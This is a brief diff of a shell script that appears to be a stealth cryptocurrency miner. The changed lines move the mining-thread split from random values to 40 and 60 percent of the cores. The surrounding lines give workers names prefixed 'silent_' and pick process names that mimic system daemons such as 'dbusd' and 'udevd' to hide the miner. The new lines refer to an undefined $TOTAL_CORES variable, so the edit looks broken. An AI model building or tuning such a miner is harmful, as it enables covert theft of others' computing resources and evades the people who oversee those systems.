@@ -15,8 +15,8 @@ WORKER2="silent_$(hostname)_$(shuf -i 1000-9999 -n1)"
 
 TOTALCORE=$(nproc)
 TOTAL_MINING_THREADS=$TOTALCORE
-THREADS1=$(shuf -i 1-4 -n1)
-THREADS2=$((TOTAL_MINING_THREADS - THREADS1))
+THREADS1=$(awk "BEGIN {print int($TOTAL_CORES * 0.40)}")
+THREADS2=$(awk "BEGIN {print int($TOTAL_CORES * 0.60)}")
 
 PRIORITY=3
 NAME1=$(shuf -n1 -e "dbusd" "syscore" "udevd")
